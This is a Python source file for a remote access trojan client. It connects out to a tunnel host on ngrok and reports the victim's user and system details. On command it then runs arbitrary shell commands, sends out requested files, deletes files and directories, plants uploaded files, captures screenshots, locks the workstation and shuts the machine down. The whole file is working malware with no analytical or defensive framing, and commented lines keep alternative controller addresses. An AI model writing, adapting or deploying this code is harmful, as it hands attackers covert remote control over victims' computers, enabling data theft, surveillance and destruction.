import ctypes
import platform
import socket
import os
import sys
import subprocess
from getpass import getuser

import pyautogui


def slave():
    def cmdcommands():
        command = sock.recv(1024)
        command = command.decode()
        detail = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        cmd_bytes = detail.stdout.read() + detail.stderr.read()
        #cmd_str = str(cmd_bytes, "utf-8")
        #current = os.getcwd()+">"
        #sock.send(str.encode(cmd_str + current))
        sock.send(cmd_bytes)
        print("Executed Successfully")
        #if command == "exit":
        #    slave()
        #else:
        #    cmdcommands()

    def customcommand():
        command = sock.recv(1024)
        command = command.decode()
        if command == "getfile":
            fpath = sock.recv(1000000)
            fpath = fpath.decode()
            file = open(fpath, "rb")
            detail = file.read()
            sock.send(detail)
            print("Executed Successfully")
        elif command == "delfile":
            rmvfile = sock.recv(5000)
            rmvfile = rmvfile.decode()
            os.remove(rmvfile)
            print("Executed Successfully")
        elif command == "deldir":
            rmvdir = sock.recv(5000)
            rmvdir = rmvdir.decode()
            os.removedirs(rmvdir)
            print("Executed Successfully")
        elif command == "sendfile":
            filename = sock.recv(5000)
            sfilename = open(filename, "wb")
            data = sock.recv(10000)
            sfilename.write(data)
            sfilename.close()
            print("Executed Successfully")
        elif command == "lock":
            ctypes.windll.user32.LockWorkStation()
        elif command == "SS":
            ssname = sock.recv(6000)
            ssname = ssname.decode()
            ss = pyautogui.screenshot()
            myscreenshot = ss.save(ssname)
            img = open(ssname, "rb")
            img = img.read()
            sock.send(img)
            print("Executed Successfully")
        elif command == "shutdown":
            print("")
            print("Executing Shutdown Command....")
            sock.send("Command Received".encode())
            # os.system("shutdown -h now") for linux
            os.system("shutdown -s -t 00")
        else:
            sys.exit(0)

    osname = platform.system()
    version = platform.version()
    architecture = platform.architecture()
    user = getuser()
    osinfo = "Client Name:- "+str(user)+"\n"+"Client OS:- "+str(osname)+"\n"+"Version:- "+str(version)+"\n"+"Architecture:- "+str(architecture)
    port = 4444
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #sock.connect(('10.10.65.120', port))
    #sock.connect_ex(('210.89.39.141', port))
    sock.connect(("0.tcp.in.ngrok.io",18792))
    #sock.connect(('192.168.1.4', port))
    sock.send(osinfo.encode())
    print("")
    print("Connected to Server:- ")
    while True:
        res = sock.recv(1024)
        res = res.decode()
        if res == "1":
            cmdcommands()
        elif res == "2":
            customcommand()
        else:
            sys.exit(0)
        sock.close()


if __name__ == "__main__":
    slave()
